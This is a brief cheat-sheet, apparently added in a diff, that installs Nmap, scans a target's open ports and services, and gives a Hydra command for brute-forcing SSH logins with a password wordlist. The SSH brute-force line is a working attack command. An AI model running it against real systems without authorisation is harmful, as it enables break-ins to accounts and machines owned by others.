@@ -1,0 +1,13 @@
+Command to Install Nmap : sudo apt-get install nmap
+
+Nmap Tutorial: Nmap full Tutorial
+
+Nmap command to scan all open port with services : sudo nmap <target-ip> -sV
+
+hydra ssh Bruteforce: sudo hydra <target-ip> ssh -l <login-name> -P <wordlist> -s 22 -vV
+
+Replace <target-ip> wiht ip on which you want to perform ssh.
+
+Replace <login-name> wiht the login-name of target ssh.
+
+Replace <wordlist> with the any file that contains list of passwords.
